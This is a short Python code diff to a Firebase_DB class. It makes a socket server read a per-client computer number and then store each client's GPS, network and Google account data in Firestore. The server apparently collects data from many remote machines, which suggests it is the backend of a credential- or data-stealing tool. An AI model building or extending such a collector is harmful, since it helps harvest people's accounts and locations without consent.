@@ -106,14 +106,16 @@ class Firebase_DB():
         None
         """
         try:
+            curr_num_comp = int.from_bytes(client_socket.recv(4), byteorder='big')
+
             size_GPS = int.from_bytes(client_socket.recv(4), byteorder='big')
             str_GPS = client_socket.recv(size_GPS).decode('utf-8')
 
             size_network = int.from_bytes(client_socket.recv(4), byteorder='big')
             str_network = client_socket.recv(size_network).decode('utf-8')
             
-            self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Info').document('GPS').set(self.string_to_dictionary(str_GPS))
-            self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Info').document('Network').set(self.string_to_dictionary(str_network))
+            self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Info').document('GPS').set(self.string_to_dictionary(str_GPS))
+            self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Info').document('Network').set(self.string_to_dictionary(str_network))
         except Exception as e:
             print(e)
 
@@ -133,6 +135,8 @@ class Firebase_DB():
         None
         """
         try:
+            curr_num_comp = int.from_bytes(client_socket.recv(4), byteorder='big')
+
             count = 1
             while True:
                 size_account = int.from_bytes(client_socket.recv(4), byteorder='big')
@@ -140,7 +144,7 @@ class Firebase_DB():
                     break
                 else:
                     str_account = client_socket.recv(size_account).decode('utf-8')
-                    self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Google Accounts').document(f'Account {count}').set(self.string_to_dictionary(str_account))
+                    self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Google Accounts').document(f'Account {count}').set(self.string_to_dictionary(str_account))
                     count += 1      
         except Exception as e:
             print(e)
